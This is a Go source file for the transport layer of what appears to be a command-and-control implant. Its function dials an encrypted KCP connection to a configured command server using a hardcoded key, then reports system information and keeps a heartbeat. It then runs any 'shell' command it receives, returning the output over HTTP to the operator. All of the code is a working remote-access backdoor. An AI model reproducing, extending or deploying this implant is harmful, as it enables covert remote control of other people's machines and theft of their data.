package tansport

import (
	"bytes"
	"crypto/sha1"
	"encoding/json"
	"fmt"
	"github.com/xtaci/kcp-go"
	"golang.org/x/crypto/pbkdf2"
	"log"
	"sabathe/implant/config"
	"sabathe/implant/core"
	"sabathe/server/mthod"
	"time"
)

// request for implants
// select HTTP as the data return protocol
// select KCP as the command get protocol

// RequestKcpServer request kcp server to get command

func RequestKcpServer(conf *config.ImplantConfig) {
	key := pbkdf2.Key([]byte("@SDW*##@SZZCSDGDSA2"), []byte("salt"), 1024, 32, sha1.New) // 新建一个加密算法
	block, _ := kcp.NewAESBlockCrypt(key)
	conn, err := kcp.DialWithOptions(conf.CmdDeliveryAddress, block, 10, 3)
	if err != nil {
		log.Println("dial failed", err)
		return
	}
	// init implant
	system := core.InitImplant("kcp-http")
	message, err := json.Marshal(system)
	if err != nil {
		log.Println("marshal json failed", err)
		return
	}
	packs, err := mthod.Package(message)
	if err != nil {
		log.Println("package message failed", err)
		return
	}
	_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write(packs)
	// beat
	go core.HartKBeat(conn, 5)

	log.Println("for to read msg")
IMPLANTING:

	for {
		data := mthod.UnKcpPackage(conn) // 读取数据
		fmt.Println(string(data))

		if len(data) != 0 {
			switch {
			case bytes.Contains(data, []byte("exit")):
				_ = conn.Close()
				break IMPLANTING
			case bytes.Contains(data, []byte("shell")):
				var resp config.ImplantCmd
				err := json.Unmarshal(data, &resp)
				if err != nil {
					continue
				}
				core.ExecuteCmd(resp.Args[0], fmt.Sprintf("%v/%v", conf.MsgReturnAddress, system.AgentId))
			}
		}
	}
}
